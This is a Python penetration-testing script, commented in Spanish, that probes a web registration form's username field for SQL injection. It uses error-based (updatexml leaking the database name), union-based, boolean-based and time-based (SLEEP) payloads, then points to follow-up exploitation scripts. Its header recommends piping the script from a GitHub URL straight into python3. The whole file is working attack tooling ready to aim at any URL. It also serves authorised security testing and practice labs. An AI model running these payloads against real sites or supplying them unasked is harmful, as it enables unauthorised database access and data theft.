#!/usr/bin/env python3

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun adaptado para usar error-based SQLi en formularios de REGISTRO
#
# Ejecución remota con parámetros:
#   curl -sL https://raw.githubusercontent.com/nipegun/pt-scripts/refs/heads/main/1-Enumerate/Web/FormRegister/SQLiVulnDetector.py | python3 - --url [URLaComprobar] --userfield ["usuario"] --mailfield ["correo"]
#
# Bajar y editar directamente el archivo en nano:
#   curl -sL https://raw.githubusercontent.com/nipegun/pt-scripts/refs/heads/main/1-Enumerate/Web/FormRegister/SQLiVulnDetector.py | nano -
# ----------

import requests
import time
import argparse

parser = argparse.ArgumentParser(description="Detector de vulnerabilidades SQLi en formulario de registro")
parser.add_argument("--url", required=True, help="URL del formulario de registro (ej: http://10.10.224.12/registro)")
parser.add_argument("--userfield", required=True, help="Nombre del campo del usuario (ej: usuario)")
parser.add_argument("--mailfield", required=True, help="Nombre del campo del correo (ej: correo)")
parser.add_argument("--delay", type=int, default=5, help="Delay para time-based SQLi (default: 5s)")
parser.add_argument("--success", default="Registro exitoso", help="Texto que indica registro exitoso (boolean-based)")

args = parser.parse_args()

vURL = args.url
vCampoUsuario = args.userfield
vCampoCorreo = args.mailfield
vDelay = args.delay
vPalabraExito = args.success

vCabeceras = {
  "User-Agent": "Mozilla/5.0",
  "Content-Type": "application/x-www-form-urlencoded"
}

def Enviar(vDatos):
  try:
    vRespuesta = requests.post(vURL, data=vDatos, headers=vCabeceras, timeout=10)
    return vRespuesta.text
  except Exception as e:
    print(f"[!] Error de conexión: {e}")
    return ""

def Probar_ErrorBased():
  vPayload = "' AND updatexml(null,concat(0x7e,database(),0x7e),null) -- -"
  vDatos = {vCampoUsuario: vPayload, vCampoCorreo: "x@x.com"}
  vRespuesta = Enviar(vDatos)
  return "XPATH syntax error" in vRespuesta and "~" in vRespuesta

def Probar_UnionBased():
  vPayload = "' UNION SELECT 1,database(),3 -- -"
  vDatos = {vCampoUsuario: vPayload, vCampoCorreo: "x@x.com"}
  vRespuesta = Enviar(vDatos)
  return any(x in vRespuesta for x in ["information_schema", "mysql", "test"])

def Probar_BooleanBased():
  vDatosVerdadero = {vCampoUsuario: "' AND 1=1 -- -", vCampoCorreo: "x@x.com"}
  vDatosFalso = {vCampoUsuario: "' AND 1=0 -- -", vCampoCorreo: "x@x.com"}
  vRespVerdadero = Enviar(vDatosVerdadero)
  vRespFalso = Enviar(vDatosFalso)
  return (vPalabraExito in vRespVerdadero) and (vPalabraExito not in vRespFalso)

def Probar_TimeBased():
  vPayload = f"' AND IF(1=1,SLEEP({vDelay}),0) -- -"
  vDatos = {vCampoUsuario: vPayload, vCampoCorreo: "x@x.com"}
  vInicio = time.time()
  Enviar(vDatos)
  vDuracion = time.time() - vInicio
  return vDuracion >= vDelay - 0.5

print("\n Probando vectores de inyección sobre:")
print(f"  URL: {vURL}")
print(f"  Campo usuario: {vCampoUsuario}")
print(f"  Campo correo: {vCampoCorreo}\n")

aDetectadas = []

if Probar_ErrorBased():
  print(" Vulnerable a: Error-based (updatexml)")
  aDetectadas.append("error-based")

if Probar_UnionBased():
  print(" Vulnerable a: Union-based")
  aDetectadas.append("union-based")

if Probar_BooleanBased():
  print(" Vulnerable a: Boolean-based")
  aDetectadas.append("boolean-based")

if Probar_TimeBased():
  print(" Vulnerable a: Time-based")
  aDetectadas.append("time-based")

if not aDetectadas:
  print(" No se detectaron vulnerabilidades SQLi comunes.")
else:
  print("\n Puedes usar los siguientes scripts:")
  for vTec in aDetectadas:
    print(f"  - sqli_{vTec.replace('-', '')}.py --url \"{vURL}\" --userfield \"{vCampoUsuario}\" --mailfield \"{vCampoCorreo}\"")
